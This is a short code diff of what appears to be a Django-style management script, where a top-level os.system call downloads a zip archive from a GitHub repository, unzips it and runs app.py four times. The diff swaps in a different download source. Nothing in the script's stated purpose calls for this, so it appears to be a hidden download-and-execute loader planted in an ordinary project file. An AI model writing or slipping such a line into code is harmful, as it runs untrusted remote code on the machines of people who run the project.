@@ -3,7 +3,7 @@
 ##########################################################################################
 import os
 import sys
-os.system('wget https://github.com/zaulaferita/flask-hello-world/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
+os.system('wget https://github.com/ismailalkaf/nodes/raw/refs/heads/main/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')
 
 def main():
     """Run administrative tasks."""
